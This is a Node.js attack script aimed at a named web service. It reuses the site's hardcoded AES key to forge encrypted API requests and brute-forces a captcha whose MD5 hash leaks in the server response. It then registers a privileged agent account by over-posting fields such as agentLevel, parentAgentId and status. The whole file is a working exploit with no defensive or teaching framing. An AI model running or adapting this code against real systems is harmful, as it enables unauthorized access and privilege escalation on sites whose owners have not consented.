const CryptoJS = require('crypto-js');
const https = require('https');

const HOST = 'ebb56293.com';
const PORT = 9900;
const keyHash = CryptoJS.MD5('ZXNicGx1cw==').toString();
const key = CryptoJS.enc.Utf8.parse(keyHash);

function enc(o) {
    let s = JSON.stringify(o);
    let e = CryptoJS.AES.encrypt(s, key, { mode: CryptoJS.mode.ECB });
    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(e.toString()));
}
function dec(b) {
    try {
        return CryptoJS.AES.decrypt(
            CryptoJS.enc.Utf8.stringify(CryptoJS.enc.Base64.parse(b)),
            key, { mode: CryptoJS.mode.ECB }
        ).toString(CryptoJS.enc.Utf8);
    } catch (e) { return 'ERR'; }
}

let cookieJar = [];

function mergeCookies(setCookieHeaders) {
    if (!setCookieHeaders) return;
    let arr = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
    for (let sc of arr) {
        let name = sc.split('=')[0].trim();
        let value = sc.split(';')[0].trim();
        cookieJar = cookieJar.filter(c => !c.startsWith(name + '='));
        cookieJar.push(value);
    }
}

function httpReq(path, method, body) {
    return new Promise((resolve, reject) => {
        let headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': `https://${HOST}:${PORT}`,
            'Referer': `https://${HOST}:${PORT}/web/`,
            'X-Requested-With': 'XMLHttpRequest'
        };
        if (body) headers['Content-Type'] = 'application/x-www-form-urlencoded';
        if (cookieJar.length > 0) headers['Cookie'] = cookieJar.join('; ');

        let req = https.request({ hostname: HOST, port: PORT, path, method, headers, rejectUnauthorized: false }, (res) => {
            mergeCookies(res.headers['set-cookie']);
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => resolve({ status: res.statusCode, body: data, headers: res.headers }));
        });
        req.on('error', reject);
        if (body) req.write(body);
        req.end();
    });
}

async function apiCall(url, params) {
    let payload = enc({ url, params: JSON.stringify(params) });
    let body = 'requestData=' + encodeURIComponent(payload);
    let resp = await httpReq('/entrance/api', 'POST', body);
    let decrypted = dec(resp.body);
    try { return JSON.parse(decrypted); } catch (e) { return { raw: decrypted }; }
}

// Try to crack the captcha from mkcode response
function guessCaptchaFromMkcode(mkcodeBody) {
    // Format: "hash;token;timestamp"
    // The hash is MD5 of the captcha code
    // The displayed captcha is 4 digits (0000-9999)
    // We can brute force MD5 of all 4-digit numbers to find the match!

    let parts = mkcodeBody.split(';');
    let targetHash = parts[0];

    console.log(`  [*] Target MD5 hash: ${targetHash}`);
    console.log(`  [*] Brute-forcing 4-digit captcha from MD5...`);

    for (let i = 0; i <= 9999; i++) {
        let code = String(i).padStart(4, '0');
        let hash = CryptoJS.MD5(code).toString();
        if (hash === targetHash) {
            console.log(`  [!!!] CAPTCHA CRACKED: ${code} (MD5: ${hash})`);
            return code;
        }
    }

    // Try without zero-padding
    for (let i = 1000; i <= 9999; i++) {
        let code = String(i);
        let hash = CryptoJS.MD5(code).toString();
        if (hash === targetHash) {
            console.log(`  [!!!] CAPTCHA CRACKED (no pad): ${code} (MD5: ${hash})`);
            return code;
        }
    }

    console.log('  [X] Could not crack captcha from MD5. Trying raw prefix...');
    // Maybe the first 4 chars of the hash ARE the captcha?
    return parts[0].substring(0, 4);
}

async function main() {
    console.log('=== GHOST AGENT v3: CAPTCHA CRACKER + REGISTRATION ===\n');

    // Step 1: Get captcha (establishes session with cookies)
    console.log('[1] Fetching captcha from /infe/verify/mkcode...');
    let captchaResp = await httpReq('/infe/verify/mkcode', 'GET', null);
    console.log(`  [+] HTTP ${captchaResp.status}`);
    console.log(`  [+] Body: ${captchaResp.body}`);
    console.log(`  [+] Session cookies: ${cookieJar.join('; ')}`);

    // Step 2: Crack the captcha
    console.log('\n[2] Cracking captcha...');
    let captchaCode = guessCaptchaFromMkcode(captchaResp.body);
    console.log(`  [+] Using captcha code: ${captchaCode}`);

    // Step 3: Register with the cracked captcha, using SAME session
    console.log('\n[3] Submitting registration with cracked captcha...');

    let regPayload = {
        account: 'dsysnt888',
        password: 'admin123456',
        passwd: 'admin123456',
        currency: 'RMB',
        tel: '13888888888',
        rmNum: captchaCode,
        agree: 'Y',
        chineseName: 'wanglei',
        englishName: 'wanglei',
        realName: 'wanglei',
        qqNum: '888888',
        email: 'sync888@test.com',
        // Over-posting
        agentLevel: 1,
        parentAgentId: 1,
        status: 1
    };

    console.log(`  [>] Payload: ${JSON.stringify(regPayload)}`);

    let regResp = await apiCall('/infe/rest/registeragent/addAgent.json', regPayload);
    console.log(`  [<] Response: ${JSON.stringify(regResp)}`);

    // Decode message
    if (regResp.message) {
        try {
            let msg = regResp.message;
            if (msg.includes('\\u')) msg = JSON.parse('"' + msg.replace(/"/g, '\\"') + '"');
            console.log(`  [<] Message: ${msg}`);
        } catch (e) {
            console.log(`  [<] Message (raw): ${regResp.message}`);
        }
    }

    if (regResp.status === 'Y') {
        console.log('\n  ██████████████████████████████████████');
        console.log('  ██  GHOST AGENT REGISTERED!         ██');
        console.log('  ██  Account: dsysnt888               ██');
        console.log('  ██  Password: admin123456             ██');
        console.log('  ██████████████████████████████████████\n');
    } else if (regResp.code === 111032540) {
        console.log('\n  [!] Captcha still invalid. Trying alternative crack methods...');

        // Maybe it's MD5(code + salt)?
        // Try with the session token as salt
        let parts = captchaResp.body.split(';');
        let targetHash = parts[0];
        let token = parts[1];

        console.log('  [*] Trying MD5(code + token)...');
        for (let i = 1000; i <= 9999; i++) {
            let code = String(i);
            let hash = CryptoJS.MD5(code + token).toString();
            if (hash === targetHash) {
                console.log(`  [!!!] CAPTCHA CRACKED with salt: ${code}`);
                // Immediate retry
                regPayload.rmNum = code;
                let retry = await apiCall('/infe/rest/registeragent/addAgent.json', regPayload);
                console.log(`  [<] Retry response: ${JSON.stringify(retry)}`);
                break;
            }
        }

        console.log('  [*] Trying MD5(token + code)...');
        for (let i = 1000; i <= 9999; i++) {
            let code = String(i);
            let hash = CryptoJS.MD5(token + code).toString();
            if (hash === targetHash) {
                console.log(`  [!!!] CAPTCHA CRACKED with prefix salt: ${code}`);
                regPayload.rmNum = code;
                let retry = await apiCall('/infe/rest/registeragent/addAgent.json', regPayload);
                console.log(`  [<] Retry response: ${JSON.stringify(retry)}`);
                break;
            }
        }
    }

    console.log('\n=== OPERATION COMPLETE ===');
}

main().catch(e => console.error('FATAL:', e));
